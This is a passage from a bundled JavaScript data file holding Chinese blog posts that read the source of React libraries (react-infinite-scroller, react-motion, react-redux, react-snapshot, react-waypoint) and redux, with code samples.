}</code></pre></code></pre>\\n</li>\\n</ol>\\n</li>\\n<li><p><code>scrollHeight</code>和<code>clientHeight</code></p>\\n<p> 在无滚动的情况下，<code>scrollHeight</code>和<code>clientHeight</code>相等，都为<code>width</code>+<code>padding</code>*2</p>\\n<p> 在有滚动的情况下，<code>scrollHeight</code>表示实际内容高度，<code>clientHeight</code>表示视口高度。</p>\\n</li>\\n<li><p>每次执行<code>loadMore</code>前卸载事件。</p>\\n<p> 确保不会重复(过多)执行<code>loadMore</code>，因为先卸载事件再执行<code>loadMore</code>，可以确保在执行过程中，<code>scroll</code>事件是无效的。</p>\\n<p> 然后再每次<code>didUpdate</code>的时候重新绑定事件。</p>\\n</li>\\n<li><p>mousewheel解决chrome的等待bug</p>\\n<p>源码中订阅<code>mousewheel</code>事件是为了处理<code>chrome</code>浏览器的一个特性(不知道是否是一种bug)。</p>\\n<p><a href=\\"https://stackoverflow.com/questions/47524205/random-high-content-download-time-in-chrome/47684257#47684257\\">stackoverflow:Chrome的滚动等待问题</a></p>\\n<p>上面这个问题主要描述，当在使用滚轮加载时，而且加载会触发<code>ajax请求</code>，当滚轮到达底部，会出现一个漫长而且无任何动作的等待(长达2-3s)。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-built_in\\">window</span>.addEventListener(<span class=\\"hljs-string\\">\\"mousewheel\\"</span>, (e) =&gt; {\\n    <span class=\\"hljs-keyword\\">if</span> (e.deltaY === <span class=\\"hljs-number\\">1</span>) {\\n        e.preventDefault()\\n    }\\n})</code></pre></code></pre>\\n<p>以上绑定可以消除这个&quot;bug&quot;。</p>\\n</li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-25","timeArr":[2018,10,25,0,0,0,0],"title":"源码阅读-react-infinite-scroller-笔记","uuid":"e4ce5c4bef01302a0d060390b3bb12ae149f583f","summary":"<ol>\\n<li>\\n<p><code>offsetParent</code></p>\\n<p><code>offsetParent</code>返回一个指向最近的包含该元素的定位元素.</p>\\n<p><code>offsetParent</code>很有用，因为计算<code>offsetTop</code>和<code>offsetLeft</code>都是相对于<code>offsetParent</code>边界的。</p>\\n<p><code>offsetParent</code>...</p>\\n</li>\\n</ol>","slug":"yuan-ma-yue-du-react-infinite-scroller-bi-ji","sha":"ca1df5a51761dd3bb612a4ab486576a8102d2d1b"}')},674:function(n){n.exports=JSON.parse('{"content":"<p>阅读<a href=\\"https://github.com/chenglou/react-motion\\">react-motion</a>的源码时候，其中有一个组件<code>TransitionMotion</code>\\n，它负责元素的新增和移除动画，内部有2个概念：<code>old</code>和<code>new</code></p>\\n<hr>\\n<p>这就先说到排序，</p>\\n<p>当动画队列出现如下状态时，该如何处理：</p>\\n<p>旧的序列： <code>a -&gt; b -&gt; x</code></p>\\n<p>新的序列： <code>c -&gt; b -&gt; d</code></p>\\n<p>这里涉及到<code>拓扑排序</code>的思想</p>\\n<ol>\\n<li><p><code>a</code>和<code>c</code>的入口点为0，因此 <code>a</code>和<code>c</code> 在<code>b</code>的前面执行，</p>\\n</li>\\n<li><p>执行完<code>a</code>和<code>c</code>后，<code>b</code>的入口点为0，因此<code>b</code>在 <code>x</code>和<code>d</code>的前面执行，</p>\\n</li>\\n<li><p>那么<code>a</code>和<code>c</code>的顺序，<code>x</code>和<code>d</code>的顺序怎么判断</p>\\n</li>\\n</ol>\\n<p>实际操作是使用原生<code>sort</code>方法，<code>sort</code>对比参数分4种情况：</p>\\n<ol>\\n<li>两者都在旧序列，那么就按旧的排序</li>\\n<li>两者都在新序列，那么就按新的排序</li>\\n<li>x在旧，y在新，那么找x和y的中间值，例如<code>a</code>和<code>d</code>的中间值就是<code>b</code>，然后根据中间值排序</li>\\n<li>x在旧，y在新，无中间值，那么按照旧序列优先，即<code>a-&gt;c</code>，<code>x-&gt;d</code></li>\\n</ol>\\n<hr>\\n<p>通过排序也定义了内部的new和old的区别：</p>\\n<pre><code><pre class=\\"hljs\\"><code>* old代表未排序的动画列表或者数据\\n例如：oldMergedPropsStyles就是未排序的mergedPropsStyles\\noldMergedPropsStyles\\noldCurrentStyles\\noldCurrentVelocities\\noldLastIdealStyles\\noldLastIdealVelocities\\n----------------------------\\n* new代表已经排序的动画列表或者数据\\n例如：newMergedPropsStyles就是已经排好序的mergedPropsStyles\\nnewMergedPropsStyles, \\nnewCurrentStyles, \\nnewCurrentVelocities, \\nnewLastIdealStyles, \\nnewLastIdealVelocities</code></pre></code></pre><p>更详细查看[react-motion源码阅读]</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-10","timeArr":[2018,7,10,0,0,0,0],"title":"源码阅读-react-motion-拓扑排序思想","uuid":"f616d21af7026eb71d6d96d1e0adfc13871af644","summary":"<h4>阅读<a href=\\"https://github.com/chenglou/react-motion\\">react-motion</a>的源码时候，其中有一个组件<code>TransitionMotion</code>\\n，它负责元素的新增和移除动画，内部有2个概念：<code>old</code>和<code>new</code></h4>\\n<p>这就先说到排序，</p>\\n<p>当动画队列出现如下状态...</p>","slug":"yuan-ma-yue-du-react-motion-tuo-pu-pai-xu-si-xiang","sha":"65c59ec0ce44ba503eeb5cfdeec3d1eba9b70047"}')},675:function(n){n.exports=JSON.parse('{"content":"<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">myFunc</span>(<span class=\\"hljs-params\\">{x=<span class=\\"hljs-number\\">1</span>,y=<span class=\\"hljs-number\\">2</span>}</span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(x,y)  \\n  <span class=\\"hljs-comment\\">// ...</span>\\n}\\nmyFunc({})      <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc()        <span class=\\"hljs-comment\\">// 报错</span>\\nmyFunc(<span class=\\"hljs-literal\\">null</span>)    <span class=\\"hljs-comment\\">// 报错</span></code></pre></code></pre>\\n<p>不传参数，则从<code>undefined</code>里面查找x和y属性，报错。</p>\\n<p>修正1 ：(可以自行调整是否支持null)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">myFunc</span>(<span class=\\"hljs-params\\">obj</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(obj===<span class=\\"hljs-literal\\">null</span>)<span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-built_in\\">Error</span>()\\n  <span class=\\"hljs-keyword\\">let</span> finalObj=<span class=\\"hljs-built_in\\">Object</span>.assign({<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>},obj)\\n  <span class=\\"hljs-built_in\\">console</span>.log(x,y)\\n  <span class=\\"hljs-comment\\">// ...</span>\\n}\\nmyFunc({})          <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc()            <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc({<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>})   <span class=\\"hljs-comment\\">// x:2,y:2</span>\\nmyFunc(<span class=\\"hljs-literal\\">null</span>)       <span class=\\"hljs-comment\\">// 报错</span></code></pre></code></pre>\\n<p>修正2 ：不支持null</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">myFunc</span>(<span class=\\"hljs-params\\">{x=<span class=\\"hljs-number\\">1</span>,y=<span class=\\"hljs-number\\">2</span>}={}</span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(x,y)  \\n  <span class=\\"hljs-comment\\">// ...</span>\\n}\\nmyFunc({})          <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc()            <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc({<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>})   <span class=\\"hljs-comment\\">// x:2,y:2</span>\\nmyFunc(<span class=\\"hljs-literal\\">null</span>)       <span class=\\"hljs-comment\\">// 报错</span></code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-18","timeArr":[2018,10,18,0,0,0,0],"title":"源码阅读-react-redux-参数为obj的默认参数写法","uuid":"42b4b2b7669e8fdbc1cd63d0eb42e60b98c48f8e","summary":"<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">myFunc</span>(<span class=\\"hljs-params\\">{x=<span class=\\"hljs-number\\">1</span>,y=<span class=\\"hljs-number\\">2</span>}</span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(x,y)  \\n  <span class=\\"hljs-comment\\">// ...</span>\\n}\\nmyFunc({})      <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc()        <span class=\\"hljs-comment\\">// 报错</span>\\nmyFunc(<span class=\\"hljs-literal\\">null</span>)    <span class=\\"hljs-comment\\">// 报错</span>\\n</code></pre>\\n<p>不传参数，则从<code>undefined</code>里...</p>","slug":"yuan-ma-yue-du-react-redux-can-shu-wei-obj-de-mo-ren-can-shu-xie-fa","sha":"bca6508299954ec1022678e1f36b060954a8e990"}')},676:function(n){n.exports=JSON.parse('{"content":"<p>Provider组件中有2个生命周期函数：</p>\\n<pre><code><pre class=\\"hljs\\"><code>componentWillUnmount() {\\n  if (this.unsubscribe) this.unsubscribe()\\n  this._isMounted = false\\n}\\n\\ncomponentDidUpdate(prevProps) {\\n  // 比较store是否相等,如果相等则跳过\\n  if (this.props.store !== prevProps.store) {\\n    // 取消订阅之前的，再订阅现在的(因为数据(store)不同了)\\n    if (this.unsubscribe) this.unsubscribe()\\n    this.subscribe()\\n  }\\n}</code></pre></code></pre><p>这2段的意思就是，每当数据变了，就取消上一次数据的订阅，在订阅本次的数据，\\n当要销毁组件，取消订阅。</p>\\n<p>这个逻辑用<code>Hooks</code>的<code>useEffect</code>简直完美匹配！</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>useEffect(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n  subscribe()\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n    unSubscribe()\\n  }\\n},props.data)</code></pre></code></pre>\\n<p>这段的意思就是，当<code>props.data</code>发生改变，执行<code>unSubscribe()</code>，再执行<code>subscribe()</code>。</p>\\n<p>逻辑完全一致！</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-18","timeArr":[2018,10,18,0,0,0,0],"title":"源码阅读-react-redux-使用Hooks替换一处逻辑","uuid":"75b7a94b953a19ffc6d8a4b8352441ee521ee46e","summary":"<p>Provider组件中有2个生命周期函数：</p>\\n<pre class=\\"hljs\\"><code>componentWillUnmount() {\\n  if (this.unsubscribe) this.unsubscribe()\\n  this._isMounted = false\\n}\\n\\ncomponentDidUpdate(prevProps) {\\n  //...</code></pre>","slug":"yuan-ma-yue-du-react-redux-shi-yong-Hooks-ti-huan-yi-chu-luo-ji","sha":"914eddfc21a7198b0e39080e62fc5cf7ec280993"}')},677:function(n){n.exports=JSON.parse('{"content":"<p><code>react-snapshot</code>一个用于react服务端渲染的工具，并没有使用<code>react V16+</code>的<code>hydrate</code>，但也能学到一些东西</p>\\n<hr>\\n<h4 id=\\"ku-glob-to-regexp\\">库<code>glob-to-regexp</code></h4>\\n<p>它可以将路径转化为正则，适用于路径匹配</p>\\n<p>例如</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>re = globToRegExp(<span class=\\"hljs-string\\">\\"*/www/*.js\\"</span>);\\nre.test(<span class=\\"hljs-string\\">\\"http://example.com/www/app.js\\"</span>); <span class=\\"hljs-comment\\">// true</span>\\nre.test(<span class=\\"hljs-string\\">\\"http://example.com/www/lib/factory-proxy-model-observer.js\\"</span>); <span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n<hr>\\n<h4 id=\\"pathjoin--yu--pathresolve-yu-urlresolve-de-qu-bie\\"><code>path.join</code> 与 <code>path.resolve</code>与<code>url.resolve</code>的区别</h4>\\n<ol>\\n<li><p>对于以/开始的路径片段，path.join只是简单的将该路径片段进行拼接，而path.resolve将以/开始的路径片段作为根目录，在此之前的路径将会被丢弃，就像是在terminal中使用cd命令一样。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> path.join(<span class=\\"hljs-string\\">\'/a\'</span>, <span class=\\"hljs-string\\">\'/b\'</span>) <span class=\\"hljs-comment\\">// \'a/b\'</span>\\n path.resolve(<span class=\\"hljs-string\\">\'/a\'</span>, <span class=\\"hljs-string\\">\'/b\'</span>) <span class=\\"hljs-comment\\">// \'/b\'</span></code></pre></code></pre>\\n</li>\\n<li><p><code>path.resolve</code>总是返回一个以相对于参数1的工作目录（working directory）的绝对路径。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> path.join(<span class=\\"hljs-string\\">\'./a\'</span>, <span class=\\"hljs-string\\">\'./b\'</span>) <span class=\\"hljs-comment\\">// \'a/b\'</span>\\n path.resolve(<span class=\\"hljs-string\\">\'./a\'</span>, <span class=\\"hljs-string\\">\'./b\'</span>) <span class=\\"hljs-comment\\">// \'/Users/username/Projects/webpack-demo/a/b\'</span></code></pre></code></pre>\\n</li>\\n<li><p><code>url.resolve(a,b)</code>返回的是url拼接的结果</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> url.resolve(<span class=\\"hljs-string\\">\'/c/\'</span>,<span class=\\"hljs-string\\">\'./xx.png\'</span>) <span class=\\"hljs-comment\\">// /c/xx.png</span>\\n url.resolve(<span class=\\"hljs-string\\">\'/c/\'</span>,<span class=\\"hljs-string\\">\'/xx.png\'</span>)  <span class=\\"hljs-comment\\">// /xx.png</span></code></pre></code></pre>\\n</li>\\n</ol>\\n<ul>\\n<li>延伸</li>\\n</ul>\\n<ol>\\n<li><p><code>require.resolve()</code>：返回完整路径，不会执行(路径必须存在)</p>\\n</li>\\n<li><p><code>process.argv</code>：当前<code>cli</code>指令参数的数组</p>\\n</li>\\n<li><p><code>process.cwd()</code>和<code>__dirname</code></p>\\n<ul>\\n<li><p><code>process.cwd()</code></p>\\n<p>  是当前执行node命令时候的文件夹地址（被哪个位置的命令执行或者调用） </p>\\n<p>  工作目录，保证了文件在不同的目录下执行时，路径始终不变</p>\\n</li>\\n<li><p><code>__dirname</code> </p>\\n<p>  是被执行的js 文件的地址 ——文件所在目录</p>\\n</li>\\n</ul>\\n</li>\\n</ol>\\n<hr>\\n<h4 id=\\"expressstatic\\">express.static</h4>\\n<p><code>express.static(root,[options])</code></p>\\n<p>托管静态资源，当请求资源时，会去查找<code>root</code>目录下的静态资源，多个<code>express.static</code>按定义顺序查找</p>\\n<p>搭配<code>app.use</code>可以设定一个虚拟目录</p>\\n<p>例如</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>app.use(<span class=\\"hljs-string\\">\'/static\'</span>,express.static(__dirname +<span class=\\"hljs-string\\">\'/public\'</span>))</code></pre></code></pre>\\n<p>当请求<code>xxx.com/static/image.png</code>就会自动查找<code>xx.com/public/image.png</code></p>\\n<hr>\\n<h4 id=\\"jsdom\\">jsdom</h4>\\n<p>一个在<code>nodeJs</code>上执行虚拟dom环境</p>\\n<p><code>react-snapshot</code>使用的<code>jsdom</code>比较旧了，版本是<code>9.4.5</code>，而当前最新<code>13.0.0</code>，而且旧版的<code>api</code>目前好像没有使用了。</p>\\n<p>因此也是找到旧版的<code>README</code>文档看的，不管是否过期，先记录吧。</p>\\n<ul>\\n<li><p><code>jsdom.env(string, [scripts], [config], callback);</code></p>\\n<p>  <code>string</code>绑定了一个url，当访问这个url的时候，让它创建一个虚拟DOM。</p>\\n<p>  <code>scripts</code>将要以<code>&lt;script&gt;</code>标签插入的js</p>\\n<p>  <code>config</code>配置</p>\\n<p>  <code>callbakc</code>两个参数，<code>err</code>和<code>window</code>这个window是虚拟DOM的<code>window</code></p>\\n</li>\\n<li><p><code>jsdom</code>的<code>window</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-built_in\\">window</span>.document.documentElement.outerHTML);\\n  <span class=\\"hljs-comment\\">// output: \\"&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;hello world&lt;/body&gt;&lt;/html&gt;\\"</span>\\n\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-built_in\\">window</span>.innerWidth);\\n  <span class=\\"hljs-comment\\">// output: 1024</span>\\n\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-keyword\\">typeof</span> <span class=\\"hljs-built_in\\">window</span>.document.getElementsByClassName);\\n  <span class=\\"hljs-comment\\">// outputs: function</span></code></pre></code></pre>\\n</li>\\n<li><p>这里的使用</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  jsdom.env({\\n    <span class=\\"hljs-comment\\">// 当访问这个url时,这里的url代替了 参数html</span>\\n    url,\\n    <span class=\\"hljs-comment\\">// 响应头设置</span>\\n    <span class=\\"hljs-attr\\">headers</span>: { <span class=\\"hljs-attr\\">Accept</span>: <span class=\\"hljs-string\\">\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\"</span> },\\n    <span class=\\"hljs-comment\\">// 当前urlPath有外部资源请求时，拦截请求并且进行配置</span>\\n    resourceLoader(resource, callback) {\\n      <span class=\\"hljs-comment\\">// host相同</span>\\n      <span class=\\"hljs-keyword\\">if</span> (resource.url.host === host) {\\n        <span class=\\"hljs-comment\\">// 继续获取资源</span>\\n        <span class=\\"hljs-comment\\">// 相当于</span>\\n        <span class=\\"hljs-comment\\">/*\\n        resource.defaultFetch(function(err,body){\\n          if(err) return callback(err);\\n          callback(null,body)\\n        });\\n        */</span>\\n        resource.defaultFetch(callback);\\n      } <span class=\\"hljs-keyword\\">else</span> {\\n        <span class=\\"hljs-comment\\">// 不获取资源(未传参数)</span>\\n        callback()\\n      }\\n    },\\n    <span class=\\"hljs-attr\\">features</span>: {\\n      <span class=\\"hljs-comment\\">// 允许jsdom 获取哪种类型的外部资源</span>\\n      <span class=\\"hljs-attr\\">FetchExternalResources</span>: [<span class=\\"hljs-string\\">\\"script\\"</span>],\\n      <span class=\\"hljs-comment\\">// 是否允许js的运行  [\\"script\\"] or `false`</span>\\n      <span class=\\"hljs-attr\\">ProcessExternalResources</span>: [<span class=\\"hljs-string\\">\\"script\\"</span>],\\n      <span class=\\"hljs-comment\\">// 需要过滤的特定资源</span>\\n      <span class=\\"hljs-attr\\">SkipExternalResources</span>: <span class=\\"hljs-literal\\">false</span>\\n    },\\n    <span class=\\"hljs-comment\\">// 将window.console 转到node的输出</span>\\n    <span class=\\"hljs-attr\\">virtualConsole</span>: jsdom.createVirtualConsole().sendTo(<span class=\\"hljs-built_in\\">console</span>),\\n    <span class=\\"hljs-comment\\">// 当window属性被创建的时候</span>\\n    <span class=\\"hljs-attr\\">created</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">err, <span class=\\"hljs-built_in\\">window</span></span>) =&gt;</span> {\\n      <span class=\\"hljs-comment\\">// 这里传出了window供外部使用</span>\\n   },\\n    <span class=\\"hljs-comment\\">// 当window创建和document读取完毕</span>\\n    <span class=\\"hljs-attr\\">done</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">err, <span class=\\"hljs-built_in\\">window</span></span>) =&gt;</span> {}\\n  })</code></pre></code></pre>\\n</li>\\n</ul>\\n<hr>\\n<h4 id=\\"kuo-zhan-reactdomhydrate\\">扩展：ReactDOM.hydrate</h4>\\n<p>在<code>React V15</code>中，客户端根据<code>data-react-checksum</code>标记判断是否复用；根据<code>data-reactid</code>标记，追踪事件处理，绑定事件。</p>\\n<p>在<code>React V16</code>中，<code>hydrate</code>用于服务端渲染，客户端会保留(尽量复用)服务端的渲染，并只对事件进行获取。</p>\\n<p>这就有以下几个注意点：</p>\\n<ul>\\n<li><p>客户端，服务端渲染内容最好一致</p>\\n</li>\\n<li><p>如果不一致，需要自行处理，不能保证<code>React</code>能完美处理，可以添加<code>suppressHydrationWarning={true}</code>来忽略当前元素的警告。</p>\\n</li>\\n<li><p>如果要求不一致，可以将不一致的内容放到生命周期函数内进行更新(服务端渲染无生命周期函数)</p>\\n<p>  例如：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">this</span>.state={\\n    <span class=\\"hljs-attr\\">isClient</span>:<span class=\\"hljs-literal\\">false</span>\\n  }\\n\\n  componentDidMount(){\\n    <span class=\\"hljs-keyword\\">this</span>.setState({\\n      <span class=\\"hljs-attr\\">isClient</span>:<span class=\\"hljs-literal\\">true</span>\\n    })\\n  }</code></pre></code></pre>\\n</li>\\n</ul>\\n","toc":[{"anchor":"ku-glob-to-regexp","level":4,"text":"库<code>glob-to-regexp</code>"},{"anchor":"pathjoin--yu--pathresolve-yu-urlresolve-de-qu-bie","level":4,"text":"<code>path.join</code> 与 <code>path.resolve</code>与<code>url.resolve</code>的区别"},{"anchor":"expressstatic","level":4,"text":"express.static"},{"anchor":"jsdom","level":4,"text":"jsdom"},{"anchor":"kuo-zhan-reactdomhydrate","level":4,"text":"扩展：ReactDOM.hydrate"}],"relatedTags":null,"created_at":"2018-12-03","timeArr":[2018,11,3,0,0,0,0],"title":"源码阅读-react-snapshot","uuid":"1c4e38c3c8cdea68cde83fbec5fb641f85a0c066","summary":"<p><code>react-snapshot</code>一个用于react服务端渲染的工具，并没有使用<code>react V16+</code>的<code>hydrate</code>，但也能学到一些东西</p>","slug":"yuan-ma-yue-du-react-snapshot","sha":"d568476c4e1852e8b6439b1bc26f6ea8435bf4bc"}')},678:function(n){n.exports=JSON.parse('{"content":"<p>流程：</p>\\n<ol>\\n<li><p>子元素获取</p>\\n<p> 通过<code>ref</code>获取子元素的<code>DOM</code></p>\\n<ul>\\n<li><p>子元素是<code>DOM</code>（最容易获取）</p>\\n</li>\\n<li><p>子元素是组件，尝试通过<code>ForwardRef</code>获取，如果子组件不是<code>ForwardRef</code>，通过<code>innerRef</code>获取</p>\\n<p>如果<code>ref</code>获取不到值，将返回（不执行）</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>父元素获取</p>\\n<p> 通过子元素的<code>parentNode</code>向上遍历，直到找到<code>overflow</code>为<code>auto</code>或者<code>scroll</code>，否则设置为<code>window</code></p>\\n<p> 通过<code>getComputedStyle</code>去获取<code>overflow</code>的值。（此处并不完美，依赖用户自觉）</p>\\n</li>\\n<li><p>判断子元素是否出现在规定范围内</p>\\n<p> 用户定义2个属性：<code>topOffset</code>和<code>bottomOffset</code>，可以理解为<code>上边线</code>和<code>下边线</code></p>\\n<p> 通过<code>getBoundingClientRect</code>，计算出<code>子元素</code>顶端和底端到<code>视口</code>顶端的距离</p>\\n<p> 通过<code>上/下边线</code>和<code>父元素</code>的高度和<code>父元素</code>顶端到视口顶端的距离，计算出<code>上/下边线</code>分别距离视口顶端的距离</p>\\n<p> 对比以上2个数据，分别赋予当前<code>子元素</code>的4种位置状态：<code>invisible</code>，<code>inside</code>，<code>below</code>，<code>above</code></p>\\n</li>\\n</ol>\\n<p>亮点：</p>\\n<ol>\\n<li><p>onNextTick ： 一个将任务加入队列执行的方案，通过<code>setTimeout(()=&gt;{},0)</code>的使用：</p>\\n<ol>\\n<li>可以在任务开始前停止。</li>\\n<li>确保<code>ref</code>能完全获取。</li>\\n<li>任务之间不会冲突。</li>\\n</ol>\\n</li>\\n<li><p>fireOnRapidScroll ： 如果<code>scroll</code>执行过快，有可能子元素上一次事件还在<code>below</code>，这一次已经是<code>above</code>，\\n 当出现这样的情况，会强制执行<code>enter</code>和<code>leave</code>事件。</p>\\n</li>\\n<li><p>使用<code>React.cloneElement</code>配置<code>this.props.children</code></p>\\n</li>\\n</ol>\\n<p>可能存在的缺陷：</p>\\n<p>当存在一个很长的<code>ul</code>列表，而给<code>ul</code>添加了<code>overflow:auto</code>，但并未设置<code>height</code>，这时<code>ul</code>并不是一个滚动组件，\\n真正的滚动还是触发在<code>window</code>，但<code>waypoint</code>会因为存在属性<code>overflow:auto</code>，而将<code>ul</code>认为是滚动组件父元素。</p>\\n<p><a href=\\"https://codesandbox.io/s/ly9y4v9m5m\\">例子</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-12-28","timeArr":[2018,11,28,0,0,0,0],"title":"源码阅读-react-waypoint","uuid":"125d2f3de95fae020f190d4c57a5cc55e26a84fd","summary":"<p>流程：</p>\\n<ol>\\n<li>\\n<p>子元素获取</p>\\n<p>通过<code>ref</code>获取子元素的<code>DOM</code></p>\\n<ul>\\n<li>子元素是<code>DOM</code>（最容易获取）</li>\\n<li>子元素是组件，尝试通过<code>ForwardRef</code>获取，如果子组件不是<code>ForwardRef</code>，通过<code>innerRef</code>获取</li>\\n</ul>\\n<p>如果<code>ref</code>获取不到值，将返回（...</p>\\n</li>\\n</ol>","slug":"yuan-ma-yue-du-react-waypoint","sha":"4b00e3a197c088451f6327743beded39e4aaad11"}')},679:function(n){n.exports=JSON.parse('{"content":"<p>先上源码：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">applyMiddleware</span>(<span class=\\"hljs-params\\">...middlewares</span>) </span>{\\n  <span class=\\"hljs-comment\\">// ...</span>\\n\\n  <span class=\\"hljs-keyword\\">let</span> dispatch = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n    <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">Error</span>(\\n    <span class=\\"hljs-string\\">`Dispatching while constructing your middleware is not allowed. `</span> +\\n    <span class=\\"hljs-string\\">`Other middleware would not be applied to this dispatch.`</span>\\n    )\\n  }\\n\\n  <span class=\\"hljs-keyword\\">const</span> middlewareAPI = {\\n    <span class=\\"hljs-attr\\">getState</span>: store.getState,\\n    <span class=\\"hljs-attr\\">dispatch</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...args</span>) =&gt;</span> dispatch(...args)\\n  }\\n\\n  <span class=\\"hljs-keyword\\">const</span> chain = middlewares.map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">middleware</span> =&gt;</span> middleware(middlewareAPI))\\n  dispatch = compose(...chain)(store.dispatch)\\n\\n  <span class=\\"hljs-comment\\">// ...</span></code></pre></code></pre>\\n<ol>\\n<li>这里定义了一个直接报错的dispatch方法</li>\\n<li>然后设定了API中的dispatch就是会报错的dispatch方法，因此在这个阶段任何使用dispatch都会得到错误提示</li>\\n<li>最后构造结束后重新赋值dispatch</li>\\n</ol>\\n<p>当时第一眼看到觉得API那个对象都已经设定了dispatch是个提示错误的函数，后面重新赋值dispatch又没有引用关系，怎么能影响到API内的dispatch呢？</p>\\n<p>后来再仔细一看，原来API中是这么设置的<code>dispatch:()=&gt;dispatch()</code>，用了函数包裹，是动态的；</p>\\n<p>当调用这个API时，则会执行当前最新的dispatch函数。</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-14","timeArr":[2018,5,14,0,0,0,0],"title":"源码阅读-redux源码一个小技巧","uuid":"69fe426e6a96922cdf337f974413968848ec6076","summary":"<p>先上源码：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">applyMiddleware</span>(<span class=\\"hljs-params\\">...middlewares</span>) </span>{\\n  <span class=\\"hljs-comment\\">// ...</span>\\n  \\n  <span class=\\"hljs-keyword\\">let</span> dispatch = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n    <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">Error</span>(\\n    <span class=\\"hljs-string\\">`Dispatching while construct...</span></code></pre>","slug":"yuan-ma-yue-du-redux-yuan-ma-yi-ge-xiao-ji-qiao","sha":"f2bdc7f7ed9f3d78acc23221e83c625f7b8568f8"}')},680:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"reselect-yuan-ma-liang-dian-jie-shao\\">reselect源码亮点介绍</h2>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reselect/README.md\\">完整源码说明注释</a></p>\\n<p>导图：</p>\\n<p><img src=\\"/article/img/reselect.png\\" alt=\\"\\"></p>\\n<h3 id=\\"defaultmemoize\\">defaultMemoize</h3>\\n<p>一个缓存函数，其内部：</p>\\n<ol>\\n<li>通过闭包保存参数和结果</li>\\n<li>每次调用对参数进行浅比较</li>\\n<li>参数比较结果相同，返回缓存的结果</li>\\n</ol>\\n<hr>\\n<h3 id=\\"createselectorcreator-createselector\\">createSelectorCreator, 